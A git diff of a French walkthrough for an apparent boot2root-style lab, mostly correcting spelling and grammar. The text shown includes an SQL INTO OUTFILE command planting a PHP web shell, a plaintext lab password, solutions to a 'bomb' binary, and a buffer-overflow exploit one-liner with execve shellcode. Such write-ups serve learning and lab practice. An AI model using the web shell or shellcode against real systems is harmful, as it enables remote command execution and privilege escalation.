@@ -33,14 +33,14 @@ Best regards.
 </pre>
 
 ## PhpMyAdmin
-- On peut donc se connecter sur le [PhpMyAdmin](https://192.168.1.96/phpmyadmin/).
+- Nous pouvons donc se connecter sur le [PhpMyAdmin](https://192.168.1.96/phpmyadmin/).
 - En changant le password de admin par celui de lmezard on peut se connecter en tant qu'admin sur le forum
 - J'essaye maintenant d'inserer un code php dans le serveur web pour qu'il soit executer par celui ci
-- En exutant cett commande sql je peux ecrire dans un fichier
+- En executant cette commande sql je peux ecrire dans un fichier.
 ```
 SELECT "<?php system($_GET['cmd']); ?>" into outfile "/dir/dir/file.php"
 ```
-- En regardant le forum type de sur [github](https://github.com/ilosuna/mylittleforum) et en testant tout les dossier un est accessible a l'ecriture `/var/www/forum/templates_c`
+- En regardant le forum type sur [github](https://github.com/ilosuna/mylittleforum) et en testant tout les dossier un est accessible a l'ecriture `/var/www/forum/templates_c`
 - Dans les home un dossier est presant LOOKATME qui contient un dossier password
 ```
 lmezard:G!@M6f4Eatau{sF"
@@ -93,7 +93,7 @@ o
 NO SPACE IN THE PASSWORD (password is case sensitive).
 ```
 - Un fichier bomb est aussi present.
-- Nous le decompilons avec binary ninja et commencons a le resoudre
+- Nous le decompilons avec binary ninja et commencons à le resoudre
 
 ### Phase 1:
 - Nous pouvons reporté la string depuis binary ninja: `Public speaking is very easy.`
@@ -160,7 +160,7 @@ Legend: code, data, rodata, value
 
 Breakpoint 1, 0x08048d7b in phase_5 ()
 </pre>
-- Se qui donne
+- Ce qui donne:
 
 | g | i | a | n | t | s |
 |:-:|:-:|:-:|:-:|:-:|:-:|
@@ -172,7 +172,7 @@ Breakpoint 1, 0x08048d7b in phase_5 ()
   - Les chiffre doivent etre entre 0 et 6
   - que le premier est egale a 4
 - avec ces informations on a testé crée un script qui teste les 775 possibilités
-- se qui donne
+- Ce qui donne:
 ```
 4 2 6 3 1 5
 ```
@@ -192,21 +192,22 @@ Public speaking is very easy.
 opekmq
 4 2 6 3 1 5
 ```
-- Se qui donne en inversant les dernier caracteres:
+- Ce qui donne en inversant les dernier caracteres:
 ```
 Publicspeakingisveryeasy.126241207201b2149opekmq426135
 ```
 
 ## Turtle
 - Il y a un fichier avec des instructions
-- En l'interpretant avec un script javascript, on voit que ca ecrit SLASH
-- En le convertissant en md5 cela donne:
+- En l'interpretant avec un script javascript, on voit que les instructions ecrivent: SLASH
+- En le convertissant en md5 nous opettenons le mot de passe de zaz
+- Ce qui donne:
 ```
 646da671ca01bb5d84dbb5fb2238dc8e
 ```
 
 ## Zaz & Root
-- On voit qu'il y a un strcpy de argv[1], le programme peut donc etre overflow
+- On voit qu'il y a un strcpy de argv[1], le programme peut donc être overflow
 ```
 $> ltrace ./exploit_me testt
 __libc_start_main(0x80483f4, 2, 0xbffff704, 0x8048440, 0x80484b0 <unfinished ...>
@@ -235,7 +236,7 @@ Stopped reason: SIGSEGV
 gdb-peda$ pattern offset AmAA
 AmAA found at offset: 140
 </pre>
-- Se qui donne
+- Ce qui donne
 ```
 ./exploit_me $(python -c "import struct; print('\x90' * (100) + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * (140 - 121) + struct.pack('<I', 0xbffff560))")
 ```
